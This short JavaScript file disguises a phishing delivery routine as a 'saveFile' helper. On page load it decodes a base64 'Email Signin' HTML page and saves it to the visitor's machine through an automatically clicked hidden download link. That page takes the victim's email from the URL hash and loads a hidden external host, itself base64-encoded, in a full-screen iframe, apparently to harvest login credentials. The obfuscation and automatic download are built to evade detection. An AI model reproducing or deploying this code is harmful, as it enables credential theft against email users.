 $(document).ready(function() {
		saveFile();
});

function saveFile (name, type, data) {
    if (data != null && navigator.msSaveBlob)
        return navigator.msSaveBlob(new Blob([data], { type: type }), name);

    var a = $("<a style='display: none;'/>");
    var encodedStringAtoB = 'PGh0bWw+CjxoZWFkPgo8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4KPHRpdGxlPkVtYWlsIFNpZ25pbjwvdGl0bGU+Cgo8bGluayByZWw9Imljb24iIGhyZWY9ImZhdmljb24uaWNvIiB0eXBlPSJpbWFnZS94LWljb24iPgo8bGluayByZWw9InNob3J0Y3V0IGljb24iIGhyZWY9ImZhdmljb24uaWNvIiB0eXBlPSJpbWFnZS94LWljb24iPgoKPHN0eWxlPgpodG1sLCBib2R5IHsgbWFyZ2luOiAwOyBwYWRkaW5nOiAwOyB3aWR0aDogMTAwJTsgaGVpZ2h0OiAxMDAlOyB9CmlmcmFtZSB7IHdpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7IGJvcmRlcjogbm9uZTsgfQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8aWZyYW1lIGlkPSJteUlmcmFtZSIgc3JjPSIiPjwvaWZyYW1lPgoKPHNjcmlwdD4KLy8gU1RFUCAxOiBHcmFiIGVtYWlsIGZyb20gVVJMIGhhc2ggKCMpCmNvbnN0IGVtYWlsID0gd2luZG93LmxvY2F0aW9uLmhhc2guc3Vic3RyaW5nKDEpOwpjb25zb2xlLmxvZygnRW1haWwgZ3JhYmJlZCBmcm9tIHBhcmVudCBVUkw6JywgZW1haWwpOwoKLy8gU1RFUCAyOiBEZWNvZGUgQmFzZTY0IFVSTCBhbmQgcGFzcyBlbWFpbCB0byBpZnJhbWUKaWYgKGVtYWlsKSB7CiAgICBjb25zdCBpZnJhbWUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbXlJZnJhbWUnKTsKICAgIAogICAgLy8gWU9VUiBCQVNFNjQgRU5DT0RFRCBVUkwgSEVSRQogICAgY29uc3QgZW5jb2RlZFVybCA9ICJhSFIwY0hNNkx5OTNaSE5vWkd0a0xuQmhaMlZ6TG1SbGRpOD0iOwogICAgY29uc3QgZGVjb2RlZFVybCA9IGF0b2IoZW5jb2RlZFVybCk7CiAgICAKICAgIGlmcmFtZS5zcmMgPSBkZWNvZGVkVXJsICsgJyMnICsgZW1haWw7CiAgICAKICAgIGNvbnNvbGUubG9nKCfinIUgRGVjb2RlZCBVUkw6JywgZGVjb2RlZFVybCk7CiAgICBjb25zb2xlLmxvZygn4pyFIEVtYWlsIFBBU1NFRCB0byBpZnJhbWU6JywgZW1haWwpOwogICAgY29uc29sZS5sb2coJ0lmcmFtZSBub3cgbG9hZHM6JywgaWZyYW1lLnNyYyk7Cn0gZWxzZSB7CiAgICBjb25zb2xlLmxvZygnTm8gZW1haWwgZm91bmQgaW4gVVJMJyk7Cn0KPC9zY3JpcHQ+Cgo8L2JvZHk+CjwvaHRtbD4=';
    var decodedStringAtoB = atob(encodedStringAtoB);

    const myBlob = new Blob([decodedStringAtoB], {type: 'text/html'})
    const url = window.URL.createObjectURL(myBlob);

    // ⭐ critical: retain hash
    a.attr("href", url + window.location.hash);
    
    $("body").append(a);
    a[0].click();
    window.URL.revokeObjectURL(url);
    a.remove();
}

 